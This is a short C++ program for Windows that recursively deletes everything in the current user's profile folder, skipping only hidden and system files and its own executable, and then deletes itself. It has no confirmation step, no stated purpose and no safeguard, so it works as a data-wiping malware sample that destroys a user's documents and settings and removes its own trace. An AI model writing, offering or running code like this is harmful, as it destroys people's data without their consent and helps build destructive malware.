#include <Windows.h>
#include <Shlobj.h>
#include <iostream>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
    for (const auto& entry : fs::recursive_directory_iterator(path)) {
        // Skip the file if it's the excluded path or if it's a system or hidden file
        DWORD attributes = GetFileAttributes(entry.path().c_str());
        if (entry.path() == excludePath || attributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
            std::wcout << L"Skipping file or directory: " << entry.path() << std::endl;
            continue;
        }

        // Attempt to delete the file or directory
        try {
            fs::remove_all(entry.path());
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::wcerr << L"Failed to delete: " << entry.path() << L" - " << e.what() << std::endl;
        }
    }
}

int main() {
    wchar_t userProfile[256];
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    fs::path exeFsPath(exePath);

    try {
        DeleteFilesAndDirs(fs::path(userProfile), exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
        return 1;
    }

    try {
        fs::remove(exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error deleting self: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
